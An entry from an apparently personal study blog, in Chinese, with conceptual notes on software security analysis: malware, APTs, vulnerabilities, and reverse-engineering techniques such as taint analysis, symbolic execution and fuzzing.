    <content type="html"><![CDATA[<blockquote><p><font color="brown"><strong>☛  前言：</strong></font><br>        今天开始着手为研究生的学习生涯打基础，这一个月我将会回顾有关计算机专业的最基础的知识点，并将缺下的东西补上，主要内容有：<br>           ◈ C 语言、数据结构、C++、汇编语言等<br>           ◈ 实验室的测试内容<br>           ◈ 每月必读的书籍<br>        这两天给我最大的感触就是“自己欠缺的东西太多了”，要想比别人的技术厉害，就要比别人付出更多的努力！必须要严格要求自己！必须要比别人花更多的时间！必须要为自己的梦想坚持下去！拼个 3 年！！</p></blockquote><h3 id="font-colorbrown一-典型的安全问题font"><a class="markdownIt-Anchor" href="#font-colorbrown一-典型的安全问题font"></a> <font color="brown">一、典型的安全问题</font></h3><blockquote><p><font color="navy"><strong>1、恶意软件</strong></font></p><ul><li>传统恶意软件一直发展的 3 个方面：渗透与扩散能力、隐蔽能力、破坏能力</li><li>恶意软件的发展历程：单机传播阶段、网络传播阶段、协同攻击阶段（分布式拒绝服务攻击、多连接跳转攻击）</li></ul><p><font color="navy"><strong>2.APT(Advanced Persistent Threat)</strong></font><br>        高可持续性威胁，RSA 和 Hacking Team 都遭受了 APT 攻击<br><br><font color="navy"><strong>3.Hacking Team 遭受 APT 攻击</strong></font></p><ul><li>各种零日漏洞和相关漏洞利用代码</li><li>远程控制平台</li><li>Fuzz 测试系统</li><li>恶意代码监测系统</li></ul><p><font color="navy"><strong>4.软件漏洞</strong></font><br>    <strong>① 消除软件漏洞很难的原因</strong></p><ul><li>软件自身越来越复杂</li><li>软件漏洞越来越多样化</li><li>软件开发周期越来越短</li></ul><p>    <strong>② JPEG 漏洞</strong><br>        JPEG 格式：文件头为 2B 的起始标志（FFD8），文件尾部为 2B 的结束标志（FFD9），中间数据由子结构组成（2B 标志码 + 2B 的长度域（大端格式） + 信息数据）<br><br><font color="navy"><strong>5.软件后门</strong></font><br>    将软件后门设计为软件漏洞的形式，对于攻击者有如下优势：</p><ul><li>难发现</li><li>易利用</li><li>难取证</li></ul></blockquote><h3 id="font-colorbrown二-软件安全性分析的目标font"><a class="markdownIt-Anchor" href="#font-colorbrown二-软件安全性分析的目标font"></a> <font color="brown">二、软件安全性分析的目标</font></h3><blockquote><p><font color="navy"><strong>1.软件安全性分析一般要回答以下三方面的问题：</strong></font></p><ul><li>存在问题</li><li>机理问题</li><li>对策问题</li></ul><p><font color="navy"><strong>2.对软件的逆向分析存在以下挑战</strong></font></p><ul><li>指令代码的理解</li><li>关联关系的抽取</li><li>复杂逻辑的解析</li></ul></blockquote><h3 id="font-colorbrown三-主要方法与技术font"><a class="markdownIt-Anchor" href="#font-colorbrown三-主要方法与技术font"></a> <font color="brown">三、主要方法与技术</font></h3><blockquote><p><font color="navy"><strong>1.按照软件逆向分析方式的不同，将软件逆向分析分为静态和动态两大类</strong></font></p><ul><li>静态分析：主要直接对软件的可执行代码进行分析，一般是在对代码反编译或反汇编的基础上，对汇编代码或其他高级语言代码进行进一步的分析</li><li>动态分析：动态分析是通过直接运行软件，然后监测软件运行过程，实施分析</li></ul><p>当前的主流分析思路：以动态分析为主，一方面利用模糊测试等技术构造执行的不同路径，另一方面也利用静态分析手段弥补动态分析过程中的不足，优化和提升动态分析的能力。<br><br><font color="navy"><strong>2.根据逆向分析获得信息的层次不同，又可以将软件逆向分析方法与技术分为：</strong></font></p><ul><li>获取代码的反汇编、反编译等</li><li>程序依赖关系分析的程序切片、污点传播分析、符号执行等；</li></ul><p><font color="navy"><strong>3.程序调试的优缺点</strong></font><br><strong>① 优点</strong></p><ul><li>避免用户对指令复杂推理过程</li><li>直接对每条指令的执行结果 进行分析</li></ul><p><strong>② 缺点</strong></p><ul><li>全面性较差（动态分析的共性缺陷）</li><li>软件自保技术的应用可能阻碍调试</li><li>调试仅能提供动态的细节信息，对用户而言，分析、理解难度仍很大</li></ul><p><font color="navy"><strong>4.程序切片</strong></font><br>    程序切片是当前用于局部代码片段分析的一种重要手段，但仍不太适合大规模代码的分析<br><br><font color="navy"><strong>5.污点传播分析</strong></font><br>    <strong>① 基本思想：<strong>将所感兴趣的数据做标记（如同染色一样），即标记为污点数据，然后通过分析对该污点数据的处理过程，根据每条指令的污点传播规则，分析数据的传递关系。<br><br>    ② 污点传播分析一般采取</strong>动态的分析方式</strong>；<br><br>    ③ 动态污点传播分析有很多方式，主要的差异：<strong>如何获得动态执行过程中具体每一条指令和指令执行前后状态</strong>，当前主要的实现方式有“<strong>基于插桩</strong>”、“<strong>基于硬件</strong>”、“<strong>基于编译器扩展</strong>” 和 “<strong>基于硬件模拟器</strong>”等实现方法<br><br><font color="navy"><strong>6.符号执行</strong></font><br>    其基本思想是将目标程序代码中部分变量和运算符号化，通过对各种条件分支的符号化表达来形成路径的约束条件。<br><br>    <font color="red"><strong>符号执行同样是一种数据流分析方法</strong></font>，其基本思想是：用<strong>符号变量</strong>作为输入参数，对程序进行<strong>模拟执行</strong>，然后对程序的执行路径进行分析，并提取路径中的约束条件，通过对约束进行求解实现对程序安全性及路径可达性等分析。<br><br><font color="navy"><strong>7.模糊测试</strong></font><br>    <strong>① 准确来说模糊测试并不是一项逆向分析技术</strong>，他最初的应用主要是为了通过构造各种畸形的数据输入来测试软件实现的正确性<br><br>    **②主要用途：**尽可能多地触发软件的各种执行路径，弥补了软件动态逆向分析的缺陷<br><br>    **③基本思想：**通过构造各种不同的输入数据，尽可能地触发执行软件的各种路径，通过对执行结果的健侧来实现相关的分析或检测目标。<br><br>    **④研究重点：**如何提高测试数据生成的针对性，从而提高模糊测试效率</p></blockquote><h3 id="font-colorbrown三-主要分析应用font"><a class="markdownIt-Anchor" href="#font-colorbrown三-主要分析应用font"></a> <font color="brown">三、主要分析应用</font></h3><blockquote><p><font color="navy"><strong>1.恶意软件分析</strong></font><br><br><font color="navy"><strong>2.网络协议逆向分析</strong></font><br>    <strong>① 协议逆向分析的方法</strong></p><ul><li>基于网络流量统计特征展开分析</li><li>直接通过逆向软件进行分析(准确性更高、分析能力更强)</li><li>基于软件逆向分析：结合协议实现代码的静态、动态逆向分析，提取网络协议中的数据包格式、关键字、协议状态机等信息</li></ul><p><font color="navy"><strong>3.软件漏洞分析与利用</strong></font><br>    对于发现软件漏洞唯一的技术手段就是：软件逆向分析</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;font color=&quot;brown&quot;&gt;&lt;strong&gt;☛  前言：&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;
        今天开始着手为研究生的学习生涯打基础，这一个月我将会回顾有关计算机专业的最基础的知识点，并将缺下的东西补上，主要内容有：&lt;
      
    
    </summary>
    
    
      <category term="《软件安全分析与应用》" scheme="https://muzibing.github.io/tags/%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B/"/>
    
  </entry>
  
</feed>
